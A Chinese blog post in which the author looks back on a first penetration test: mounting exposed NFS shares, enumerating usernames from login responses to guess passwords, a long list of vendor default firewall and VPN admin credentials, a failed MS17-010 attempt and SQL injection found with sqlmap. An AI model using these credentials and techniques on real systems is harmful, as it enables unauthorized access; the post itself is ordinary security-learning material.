<h1 id="&#x6D45;&#x8C08;&#x9047;&#x5230;&#x8FC7;&#x7684;&#x6709;&#x8DA3;&#x7684;&#x4E1C;&#x897F;"><a href="#&#x6D45;&#x8C08;&#x9047;&#x5230;&#x8FC7;&#x7684;&#x6709;&#x8DA3;&#x7684;&#x4E1C;&#x897F;" class="headerlink" title="&#x6D45;&#x8C08;&#x9047;&#x5230;&#x8FC7;&#x7684;&#x6709;&#x8DA3;&#x7684;&#x4E1C;&#x897F;"></a>&#x6D45;&#x8C08;&#x9047;&#x5230;&#x8FC7;&#x7684;&#x6709;&#x8DA3;&#x7684;&#x4E1C;&#x897F;</h1><p>&#x540E;&#x77E5;&#x540E;&#x89C9;&#x8FD8;&#x662F;&#x79EF;&#x7D2F;&#x592A;&#x5C11;</p>
<h2 id="NFS&#x7684;&#x5B89;&#x5168;&#x9690;&#x60A3;"><a href="#NFS&#x7684;&#x5B89;&#x5168;&#x9690;&#x60A3;" class="headerlink" title="NFS&#x7684;&#x5B89;&#x5168;&#x9690;&#x60A3;"></a>NFS&#x7684;&#x5B89;&#x5168;&#x9690;&#x60A3;</h2><p>&#x8FD9;&#x4E2A;&#x662F;&#x771F;&#x7684;&#x7B2C;&#x4E00;&#x6B21;&#x9047;&#x5230;&#xFF0C;&#x4E00;&#x5F00;&#x59CB;&#x8FD8;&#x4EE5;&#x4E3A;&#x6CA1;&#x4EC0;&#x4E48;&#xFF0C;&#x4E00;&#x987F;&#x64CD;&#x4F5C;&#x53D1;&#x73B0;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x51E0;&#x4E4E;&#x5168;&#x90E8;&#x5171;&#x4EAB;&#x7684;&#x6570;&#x636E;&#xFF08;orz&#x2026;</p>
<p>&#x8D77;&#x56E0;&#x662F; Nessus &#x7206;&#x6D1E;<br><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193606-077dc53e-c4d1-1.png" alt></p>
<p>&#x7136;&#x540E;&#x6211;&#x73B0;&#x627E;&#x4E86;&#x5199;&#x7684;&#x5F88;&#x8BE6;&#x7EC6;&#x7684;&#x6587;&#x7AE0;&#x8FDB;&#x884C;&#x5BF9;&#x8BE5;&#x6F0F;&#x6D1E;&#x8FDB;&#x884C;&#x4E86;&#x590D;&#x73B0;</p>
<p><a href="https://www.freebuf.com/articles/network/159468.html" target="_blank" rel="noopener">&#x9488;&#x5BF9;NFS&#x7684;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;</a></p>
<p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x4E24;&#x6B65;&#x8D70;&#xFF1A;<br><code>showmount -e &lt;IP&gt;</code><br><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193612-0ad2c612-c4d1-1.png" alt></p>
<p>&#x7136;&#x540E;&#x6302;&#x8F7D;&#x5230;&#x672C;&#x5730;<br></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">mkdir &lt;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&gt;</span><br><span class="line">mount -t nfs &lt;ip&gt;:/&lt;&#x4F60;&#x8981;&#x6302;&#x7684;&#x76EE;&#x5F55;&gt; /&lt;&#x4F60;&#x521A;&#x521A;&#x521B;&#x5EFA;&#x7684;&#x76EE;&#x5F55;&gt; -o nolock</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8FD9;&#x4E2A;&#x70B9;&#x771F;&#x7684;&#x80FD;&#x62FF;&#x86EE;&#x591A;&#x6570;&#x636E;&#x7684;<br><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193616-0d48d01c-c4d1-1.png" alt></p>
<p>&#x540E;&#x9762;&#x5C31;&#x4E0D;&#x8D34;&#x56FE;&#x4E86;&#x2026;</p>
<h2 id="&#x5F31;&#x5BC6;&#x7801;&#x554A;&#x5F31;&#x5BC6;&#x7801;"><a href="#&#x5F31;&#x5BC6;&#x7801;&#x554A;&#x5F31;&#x5BC6;&#x7801;" class="headerlink" title="&#x5F31;&#x5BC6;&#x7801;&#x554A;&#x5F31;&#x5BC6;&#x7801;"></a>&#x5F31;&#x5BC6;&#x7801;&#x554A;&#x5F31;&#x5BC6;&#x7801;</h2><p>&#x771F;&#x7684;&#x597D;&#x591A;&#x597D;&#x591A;&#x5F31;&#x5BC6;&#x7801;&#xFF01;</p>
<p>&#x5C0F;&#x6280;&#x5DE7;&#x5C31;&#x662F;<br>&#x9A8C;&#x8BC1;&#x7206;&#x7834;&#x7528;&#x6237;&#x540D;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x770B;response&#x5305;&#x91CC;&#x7684;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x2026;&#x6BD4;&#x5982;&#x5B58;&#x5728;&#x7528;&#x6237;&#x540D;&#x4F46;&#x662F;&#x5BC6;&#x7801;&#x4E0D;&#x5BF9;&#xFF0C;&#x5C31;&#x4F1A;&#x663E;&#x793A;<code>&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#x4E0D;&#x5339;&#x914D;</code>&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x7528;&#x6237;&#x540D;&#x5C31;&#x4F1A;&#x663E;&#x793A;<code>&#x4E0D;&#x5B58;&#x5728;&#x7528;&#x6237;&#x540D;</code><br>&#x7136;&#x540E;&#x5148;&#x6839;&#x636E;&#x8FD4;&#x56DE;&#x5305;&#x627E;&#x5230;&#x5408;&#x9002;&#x7684;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x518D;&#x7528;&#x5B57;&#x5178;&#x6709;&#x9488;&#x5BF9;&#x6027;&#x7684;&#x7206;&#x7834;&#x8BE5;&#x7528;&#x6237;&#x540D;&#x7684;&#x5BC6;&#x7801;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x56DE;&#x663E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; <strong>&#x5FD8;&#x8BB0;&#x5BC6;&#x7801;</strong> &#x7B49;&#x9009;&#x9879;&#x6765;&#x8FDB;&#x4E00;&#x6B65;&#x6D4B;&#x8BD5;&#xFF0C;&#x627E;&#x56DE;&#x8FC7;&#x7A0B;&#x4E2D;&#x5982;&#x679C;&#x8BF4;&#x7528;&#x6237;&#x6B63;&#x786E;&#x5C31;&#x4F1A;&#x8FDB;&#x5165;&#x4E0B;&#x4E00;&#x6B65;&#x64CD;&#x4F5C;&#xFF0C;&#x6BD4;&#x5982;&#x53D1;&#x9001;&#x77ED;&#x4FE1;&#x9A8C;&#x8BC1;&#x7801;&#xFF0C;&#x5982;&#x679C;&#x8BF4;&#x6CA1;&#x6709;&#x7528;&#x6237;&#x5C31;&#x4E0D;&#x4F1A;&#x8FDB;&#x5165;&#x4E0B;&#x4E00;&#x6B65;&#x64CD;&#x4F5C;</p>
<p>&#x9996;&#x5148;&#x4E00;&#x822C;&#x5F31;&#x5BC6;&#x7801;&#x53D1;&#x751F;&#x5728;&#x5982;&#x4E0B;&#x51E0;&#x4E2A;&#x5730;&#x65B9;&#xFF1A;</p>
<ol>
<li>&#x6CA1;&#x6709;&#x9650;&#x5236;&#x767B;&#x5F55;&#x5931;&#x8D25;&#x6B21;&#x6570;&#x7684;&#x767B;&#x5F55;&#x6846;</li>
<li>&#x6CA1;&#x6709;&#x9A8C;&#x8BC1;&#x7801;&#x6216;&#x8005;&#x9A8C;&#x8BC1;&#x7801;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;(&#x6BD4;&#x5982;&#x91C7;&#x7528;&#x524D;&#x7AEF;&#x6821;&#x9A8C;)&#x7684;&#x767B;&#x5F55;&#x6846;</li>
</ol>
<p>&#x7ECF;&#x8FC7;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x7EDF;&#x8BA1;&#x548C;&#x5206;&#x6790;&#xFF0C;&#x5C06;&#x5F31;&#x5BC6;&#x7801;&#x5927;&#x81F4;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x60C5;&#x51B5;</p>
<ol>
<li>js&#x91CC;&#x6709;&#x6CE8;&#x91CA;&#x6389;&#x7684;&#x6D4B;&#x8BD5;&#x8D26;&#x53F7;&#x5BC6;&#x7801;</li>
<li>&#x5404;&#x79CD;&#x767B;&#x5F55;&#x754C;&#x9762;&#xFF0C;&#x5404;&#x79CD;&#x540E;&#x53F0;&#x5B58;&#x5728;&#x6D4B;&#x8BD5;&#x8D26;&#x53F7;&#xFF0C;&#x4E14;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x654F;&#x611F;&#x6570;&#x636E;&#xFF08;&#x8FD9;&#x5C31;&#x53EF;&#x80FD;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;test test &#x53EF;&#x4EE5;&#x8FDB;&#x53BB;&#x7684;&#x539F;&#x56E0;&#x5427;&#xFF09;</li>
<li>&#x6539;&#x4E86;&#x7BA1;&#x7406;&#x540E;&#x53F0;&#x9875;&#x9762;&#x7684;&#x6240;&#x6709;&#x5F31;&#x5BC6;&#x7801;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x5176;&#x4ED6;&#x5730;&#x65B9;&#xFF0C;&#x6BD4;&#x5982;&#x529E;&#x516C;&#x7CFB;&#x7EDF;&#x7B49;&#xFF0C;&#x6709;&#x5458;&#x5DE5;&#x6CA1;&#x6709;&#x6539;&#x81EA;&#x5DF1;&#x7684;&#x767B;&#x5F55;&#x5BC6;&#x7801;&#xFF0C;&#x7ECF;&#x8FC7;&#x7206;&#x7834;&#x53EF;&#x4EE5;&#x767B;&#x5F55;&#x5458;&#x5DE5;&#x8D26;&#x53F7;</li>
<li>&#x5F88;&#x591A;&#x516C;&#x53F8;&#x91C7;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x662F;&#x5916;&#x90E8;&#x5F00;&#x53D1;&#x7684;&#xFF0C;&#x5916;&#x90E8;&#x5F00;&#x53D1;&#x7684;&#x65F6;&#x5019;&#x6709;&#x6D4B;&#x8BD5;&#x8D26;&#x53F7;&#x662F;&#x5F31;&#x5BC6;&#x7801;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x80FD;&#x4EA4;&#x63A5;&#x8FC7;&#x7A0B;&#x4E2D;&#x5B58;&#x5728;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x5BFC;&#x81F4;&#x8FD9;&#x8FB9;&#x516C;&#x53F8;&#x6839;&#x672C;&#x5C31;&#x4E0D;&#x77E5;&#x9053;&#x6709;&#x8FD9;&#x4E2A;&#x8D26;&#x53F7;&#x5BC6;&#x7801;</li>
<li>&#x5F88;&#x591A;&#x8BBE;&#x5907;&#xFF0C;&#x6BD4;&#x5982;&#x5185;&#x7F51;&#x91CC;&#x9762;&#x7684;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x4E86;&#x51FA;&#x5382;&#x9ED8;&#x8BA4;&#x7684;&#x5BC6;&#x7801;</li>
<li>&#x5927;&#x5BB6;&#x90FD;&#x6BD4;&#x8F83;&#x61D2;&#xFF0C;&#x90FD;&#x4E0D;&#x60F3;&#x6CE8;&#x518C;&#x5F88;&#x957F;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x7136;&#x540E;&#x53EF;&#x80FD;&#x53C8;&#x89C9;&#x5F97;11111&#x8FD9;&#x79CD;&#x4E0D;&#x5408;&#x9002;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x6709;&#x4E86;&#x90A3;&#x79CD;&#x952E;&#x76D8;&#x8FDE;&#x952E;&#xFF0C;&#x5982;qwe123&#x4E4B;&#x7C7B;&#x7684;&#xFF0C;&#x5BFC;&#x81F4;&#x8DD1;&#x4E00;&#x4E2A;&#x5B57;&#x5178;&#x51FA;&#x4E00;&#x5806;&#x8D26;&#x53F7;&#x5BC6;&#x7801;</li>
</ol>
<p>&#x7F51;&#x4E0A;&#x5927;&#x4F6C;&#x6536;&#x96C6;&#x7684;&#xFF0C;&#x5206;&#x4EAB;&#x7ED9;&#x5927;&#x5BB6;<br></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">&#x5929;&#x878D;&#x4FE1;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x8BC1;&#x4E66; &#x767B;&#x5F55;&#x5730;&#x5740;:https://192.168.1.254 &#x7528;&#x6237;&#x540D;:superman &#x5BC6;&#x7801;:talent &#x6280;&#x672F;&#x652F;&#x6301;&#x70ED;&#x7EBF;&#xFF1A;8008105119</span><br><span class="line"></span><br><span class="line">&#x5929;&#x878D;&#x4FE1;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x8BC1;&#x4E66; &#x767B;&#x5F55;&#x5730;&#x5740;:https://192.168.1.254&#xFF1A;8080 &#x7528;&#x6237;&#x540D;:superman &#x5BC6;&#x7801;:talent&#xFF01;23 &#x9047;&#x5230;&#x8BBE;&#x5907;&#x9700;&#x8981;&#x628A;&#x65E7;&#x8BBE;&#x5907;&#x914D;&#x7F6E;&#x5907;&#x4EFD;&#x4E0B;&#x6765;&#xFF0C;&#x518D;&#x5012;&#x5165;&#x65B0;&#x8BBE;&#x5907;&#x57FA;&#x4E8E;console&#x53E3;&#x767B;&#x9646;&#xFF0C;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x5BC6;&#x7801;&#x8DDF;web&#x754C;&#x9762;&#x4E00;&#x81F4; system config reset &#x6E05;&#x9664;&#x914D;&#x7F6E; save &#x4FDD;&#x5B58; </span><br><span class="line"></span><br><span class="line">&#x8054;&#x60F3;&#x7F51;&#x5FA1;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x9700;&#x8981;&#x8BC1;&#x4E66;&#xFF08;&#x6700;&#x597D;&#x7528;IE&#x6D4F;&#x89C8;&#x5668;&#x767B;&#x5F55;&#xFF09; &#x767B;&#x5F55;&#x5730;&#x5740;:https://10.1.5.254:8889 &#x7528;&#x6237;&#x540D;:admin &#x5BC6;&#x7801;:leadsec@7766&#x3001;administrator&#x3001;bane@7766 &#x6280;&#x672F;&#x652F;&#x6301;&#x70ED;&#x7EBF;&#xFF1A;4008107766 010-56632666</span><br><span class="line"></span><br><span class="line">&#x6DF1;&#x4FE1;&#x670D;&#x9632;&#x706B;&#x5899;&#xFF08;&#x6CE8;&#x5B89;&#x5168;&#x8BBE;&#x5907;&#x7BA1;&#x7406;&#x5730;&#x5740;&#x4E0D;&#x662F;&#x552F;&#x4E00;&#x7684;&#xFF09; https://10.251.251.251</span><br><span class="line">https://10.254.254.254 &#x7528;&#x6237;&#x540D;&#xFF1A;admin &#x5BC6;&#x7801;&#xFF1A;admin &#x6280;&#x672F;&#x652F;&#x6301;&#x70ED;&#x7EBF;&#xFF1A;4006306430</span><br><span class="line"></span><br><span class="line">&#x542F;&#x660E;&#x661F;&#x8FB0; https://10.1.5.254:8889 &#x7528;&#x6237;&#x540D;&#xFF1A;admin &#x5BC6;&#x7801;&#xFF1A;bane@7766</span><br><span class="line">https://10.50.10.45:8889 &#x7528;&#x6237;&#x540D;&#xFF1A;admin &#x5BC6;&#x7801;&#xFF1A;admin@123 &#x7535;&#x8111;&#x7AEF;IP&#xFF1A;10.50.10.44/255.255.255.0 &#x6280;&#x672F;&#x652F;&#x6301;&#x70ED;&#x7EBF;&#xFF1A;4006243900</span><br><span class="line"></span><br><span class="line">juniper &#x767B;&#x5F55;&#x5730;&#x5740;:https://192.168.1.1 &#x7528;&#x6237;&#x540D;:netscreen &#x5BC6;&#x7801;:netscreen</span><br><span class="line"></span><br><span class="line">Cisco &#x767B;&#x5F55;&#x5730;&#x5740;:https://192.168.0.1 &#x7528;&#x6237;&#x540D;:admin &#x5BC6;&#x7801;:cisco</span><br><span class="line"></span><br><span class="line">Huawei &#x767B;&#x5F55;&#x5730;&#x5740;:http://192.168.0.1 &#x7528;&#x6237;&#x540D;:admin &#x5BC6;&#x7801;:Admin@123</span><br><span class="line"></span><br><span class="line">H3C &#x767B;&#x5F55;&#x5730;&#x5740;:http://192.168.0.1 &#x7528;&#x6237;&#x540D;:admin &#x5BC6;&#x7801;:admin &#x6280;&#x672F;&#x652F;&#x6301;&#x70ED;&#x7EBF;&#xFF1A;4006306430</span><br><span class="line"></span><br><span class="line">&#x7EFF;&#x76DF;IPS https://192.168.1.101 &#x7528;&#x6237;&#x540D;: weboper &#x5BC6;&#x7801;: weboper &#x914D;&#x7F6E;&#x91CD;&#x542F;&#x751F;&#x6548;</span><br><span class="line"></span><br><span class="line">&#x7F51;&#x795E;&#x9632;&#x706B;&#x5899;GE1&#x53E3; https://10.50.10.45 &#x7528;&#x6237;&#x540D;&#xFF1A;admin &#x5BC6;&#x7801;&#xFF1A;firewall &#x6280;&#x672F;&#x652F;&#x6301;&#x70ED;&#x7EBF;&#xFF1A;4006108220</span><br><span class="line"></span><br><span class="line">&#x6DF1;&#x4FE1;&#x670D;VPN&#xFF1A; 51111&#x7AEF;&#x53E3; delanrecover</span><br><span class="line"></span><br><span class="line">&#x534E;&#x4E3A;VPN&#xFF1A;&#x8D26;&#x53F7;&#xFF1A;root &#x5BC6;&#x7801;&#xFF1A;mduadmin</span><br><span class="line"></span><br><span class="line">&#x534E;&#x4E3A;&#x9632;&#x706B;&#x5899;&#xFF1A; admin Admin@123 eudemon</span><br><span class="line"></span><br><span class="line">eudemon Juniper&#x9632;&#x706B;&#x5899;&#xFF1A; netscreen netscreen</span><br><span class="line"></span><br><span class="line">&#x8FEA;&#x666E; 192.168.0.1 &#x9ED8;&#x8BA4;&#x7684;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#xFF08;admin/admin_default)</span><br><span class="line"></span><br><span class="line">&#x5C71;&#x77F3; 192.168.1.1 &#x9ED8;&#x8BA4;&#x7684;&#x7BA1;&#x7406;&#x8D26;&#x53F7;&#x4E3A;hillstone&#xFF0C;&#x5BC6;&#x7801;&#x4E3A;hillstone</span><br><span class="line"></span><br><span class="line">&#x5B89;&#x6052;&#x7684;&#x660E;&#x5FA1;&#x9632;&#x706B;&#x5899; admin/adminadmin</span><br><span class="line"></span><br><span class="line">&#x67D0;&#x5821;&#x5792;&#x673A; shterm/shterm</span><br><span class="line"></span><br><span class="line">&#x5929;&#x878D;&#x4FE1;&#x7684;vpn test/123456</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="MS17-010&#x80FD;&#x9A8C;&#x8BC1;&#x4F46;&#x662F;&#x53CD;&#x5F39;&#x4E0D;&#x4E86;&#x4F1A;&#x8BDD;"><a href="#MS17-010&#x80FD;&#x9A8C;&#x8BC1;&#x4F46;&#x662F;&#x53CD;&#x5F39;&#x4E0D;&#x4E86;&#x4F1A;&#x8BDD;" class="headerlink" title="MS17-010&#x80FD;&#x9A8C;&#x8BC1;&#x4F46;&#x662F;&#x53CD;&#x5F39;&#x4E0D;&#x4E86;&#x4F1A;&#x8BDD;"></a>MS17-010&#x80FD;&#x9A8C;&#x8BC1;&#x4F46;&#x662F;&#x53CD;&#x5F39;&#x4E0D;&#x4E86;&#x4F1A;&#x8BDD;</h2><p>&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#x8FD9;&#x79CD;&#x4E1C;&#x897F;&#x4E4B;&#x524D;&#x8DDF;&#x7740;&#x7F51;&#x4E0A;&#x7684;&#x590D;&#x73B0;&#x8FC7;&#x2026;&#x7F51;&#x4E0A;&#x590D;&#x73B0;&#x6587;&#x7AE0;&#x901A;&#x5E38;&#x4E5F;&#x662F;&#x5728;C&#x6BB5;&#x7136;&#x540E;MSF&#x4E00;&#x628A;&#x68AD;&#x2026;</p>
<p>&#x6240;&#x4EE5;&#x771F;&#x6B63;&#x5F53;&#x6211;&#x9047;&#x5230;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x7528; &#x9A8C;&#x8BC1;&#x6A21;&#x5757;&#xFF08;use auxiliary/scanner/smb/smb_ms17_010&#xFF09;&#x9A8C;&#x8BC1;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x5C31;&#x4EE5;&#x4E3A;&#x6210;&#x529F;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x5229;&#x7528;&#x653B;&#x51FB;&#x6A21;&#x5757;&#x5374;&#x5E76;&#x4E0D;&#x80FD;&#x53CD;&#x5F39;&#x4F1A;&#x8BDD;</p>
<p>&#x7136;&#x540E;&#x53BB;&#x4E86;t00ls&#x53D1;&#x4E86;&#x4E00;&#x7BC7;&#x6C42;&#x52A9;&#x5E16; <a href="https://www.t00ls.net/thread-52382-1-1.html" target="_blank" rel="noopener">[&#x3010;&#x6C42;&#x795E;&#x95EE;&#x535C;&#x3011;] &#x6C42;&#x95EE;&#x5173;&#x4E8E;&#x5185;&#x7F51;&#x4E2D;ms17-010&#x7684;&#x5229;&#x7528;</a></p>
<p>&#x4E0B;&#x9762;&#x7684;&#x56DE;&#x7B54;&#x90FD;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x5E2E;&#x52A9;&#x5230;&#x4E86;&#x6211;&#x2026;</p>
<blockquote>
<p> 03&#x4F7F;&#x7528;&#x6C38;&#x6052;&#x6D6A;&#x6F2B;&#x653B;&#x51FB;&#xFF0C;&#x4E0D;&#x8981;&#x4F7F;&#x7528;&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#xFF0C;&#x6CA1;&#x7528;&#x3002;&#x8BF7;&#x4F7F;&#x7528;&#x539F;&#x7248;&#xFF0C;&#x4E0D;&#x8981;&#x7528;msf&#x7684;&#x3002;</p>
</blockquote>
<p>&#x7136;&#x540E;&#x6211;&#x4E86;&#x89E3;&#x4E86;&#x4E00;&#x4E0B;&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#x7684;&#x5386;&#x53F2;&#xFF0C;&#x548C; NSA &#x539F;&#x7248;&#x653B;&#x51FB;&#x5DE5;&#x5177;</p>
<p>&#x5177;&#x4F53;&#x53EF;&#x770B;&#x4E00;&#x4E0B;&#x6211;&#x8F6C;&#x8F7D;&#x7684;&#x535A;&#x5BA2; <a href="https://p2hm1n.github.io/2019/08/16/Shadow-Brokers-From-git-clone-to-Pwned/#more" target="_blank" rel="noopener">Shadow Brokers - From git clone to Pwned</a></p>
<p>&#x8FD8;&#x6709;&#x7F51;&#x4E0A;&#x4E00;&#x4E2A;&#x5927;&#x5E08;&#x5085;&#x7684;&#x590D;&#x73B0;&#x771F;&#x7684;&#x975E;&#x5E38;&#x8BE6;&#x7EC6;&#xFF08;&#x819C;orz&#xFF09;<br><a href="http://note.cfyqy.com/posts/caffa366.html" target="_blank" rel="noopener">&#x6C38;&#x6052;&#x4E4B;&#x84DD;&#x3001;&#x6C38;&#x6052;&#x6D6A;&#x6F2B;&#x3001;&#x6C38;&#x6052;&#x51A0;&#x519B;&#x590D;&#x73B0;</a></p>
<p>&#x5F88;&#x53EF;&#x60DC;&#x7684;&#x662F;&#x56E0;&#x4E3A;&#x4E00;&#x4E9B;&#x65F6;&#x95F4;&#x7684;&#x539F;&#x56E0;&#x6700;&#x540E;&#x4E5F;&#x6CA1;&#x80FD;&#x6210;&#x529F;&#x5229;&#x7528;&#xFF0C;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x8DDF;&#x6F0F;&#x6D1E;&#x90FD;&#x662F;&#x4E00;&#x4E2A;&#x64E6;&#x80A9;&#x800C;&#x8FC7;&#x7684;&#x8DDD;&#x79BB;</p>
<h2 id="&#x771F;&#x7684;&#x6CA1;&#x529E;&#x6CD5;&#x8FDB;&#x884C;sql&#x6CE8;&#x5165;&#x4E86;&#x5417;&#xFF1F;"><a href="#&#x771F;&#x7684;&#x6CA1;&#x529E;&#x6CD5;&#x8FDB;&#x884C;sql&#x6CE8;&#x5165;&#x4E86;&#x5417;&#xFF1F;" class="headerlink" title="&#x771F;&#x7684;&#x6CA1;&#x529E;&#x6CD5;&#x8FDB;&#x884C;sql&#x6CE8;&#x5165;&#x4E86;&#x5417;&#xFF1F;"></a>&#x771F;&#x7684;&#x6CA1;&#x529E;&#x6CD5;&#x8FDB;&#x884C;sql&#x6CE8;&#x5165;&#x4E86;&#x5417;&#xFF1F;</h2><p>&#x8FD9;&#x4E2A;&#x70B9;&#x7ED9;&#x6211;&#x7684;&#x611F;&#x89E6;&#x86EE;&#x6DF1;&#x7684;&#xFF0C;&#x5B66;sql&#x6CE8;&#x5165;&#x7684;&#x65F6;&#x5019;&#x77E5;&#x9053;sql&#x6CE8;&#x5165;&#x53D1;&#x751F;&#x7684;&#x70B9;&#x662F;&#xFF1A; <strong>&#x589E; &#x5220; &#x6539; &#x67E5;</strong>&#xFF0C;&#x4E00;&#x5207;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x4EA4;&#x4E92;&#x7684;&#x5730;&#x65B9;&#x90FD;&#x6709;&#x53EF;&#x80FD;&#x8FDB;&#x884C;sql&#x6CE8;&#x5165;</p>
<p>&#x4F46;&#x662F;&#x771F;&#x6B63;&#x5B9E;&#x9645;&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#x6EE1;&#x8111;&#x5B50;&#x90FD;&#x662F;&#x767B;&#x5F55;&#x6846;&#x7684;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#xFF0C;&#x751A;&#x81F3;&#x4E3A;&#x4E86;&#x8FFD;&#x6C42;&#x901F;&#x5EA6;&#xFF0C;&#x517B;&#x6210;&#x4E86;&#x6307;&#x5B9A;&#x53C2;&#x6570;&#x8FD9;&#x79CD;&#x4E0D;&#x597D;&#x7684;&#x4E60;&#x60EF;&#xFF0C;&#x6240;&#x4EE5;&#x8FDE;&#x7740;&#x5F88;&#x4E45;&#x90FD;&#x6CA1;&#x6709;&#x6316;&#x51FA;sql&#x6CE8;&#x5165;</p>
<p>&#x6700;&#x540E;&#x7531;&#x4E8E;&#x7F51;&#x7AD9;&#x7684;&#x7279;&#x6B8A;&#x6027;&#xFF0C;&#x8BE5;&#x7F51;&#x7AD9;&#x5FD8;&#x8BB0;&#x5BC6;&#x7801;&#x754C;&#x9762;&#x9700;&#x8981;&#x63D0;&#x4F9B;&#x6CE8;&#x518C;&#x754C;&#x9762;&#x7684;&#x624B;&#x673A;&#x53F7;&#xFF08;emm&#x4E0D;&#x65B9;&#x4FBF;&#x622A;&#x56FE;&#x2026;&#xFF09;&#xFF0C;&#x6700;&#x540E;&#x5728;POST&#x5305;&#x91CC;&#x9762;&#x7684;&#x4E00;&#x4E2A;&#x4E0D;&#x663E;&#x773C;&#x7684;&#x53C2;&#x6570;&#x5B58;&#x5728;sql&#x6CE8;&#x5165;&#x2026;</p>
<p>&#x7ED9;&#x7684;&#x4F53;&#x4F1A;&#x5C31;&#x662F;&#x6E17;&#x900F;&#x8FC7;&#x7A0B;&#x4E2D;&#x5343;&#x4E07;&#x4E0D;&#x8981;&#x5077;&#x61D2;&#xFF0C;&#x6240;&#x6709;get&#xFF0C;post&#x7684;&#x53C2;&#x6570;&#x51E1;&#x662F;&#x4F60;&#x89C9;&#x5F97;&#x80FD;&#x591F;&#x548C;&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;&#x7684;&#xFF0C;&#x80FD;&#x624B;&#x6D4B;&#x5C31;&#x624B;&#x6D4B;&#xFF0C;&#x4E0D;&#x80FD;&#x624B;&#x6D4B;&#x5C31;&#x7528;sqlmap&#x8DD1;</p>
<p>&#x7EC6;&#x5FC3;&#x4E00;&#x70B9;&#xFF0C;&#x6BCF;&#x4E2A;&#x5730;&#x65B9;&#x90FD;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;</p>
<p>&#x5229;&#x7528;&#x4E86;sqlmap&#x6700;&#x7EC8;&#x8DD1;&#x51FA;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#x2026;<br><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193618-0ec69e2e-c4d1-1.png" alt></p>
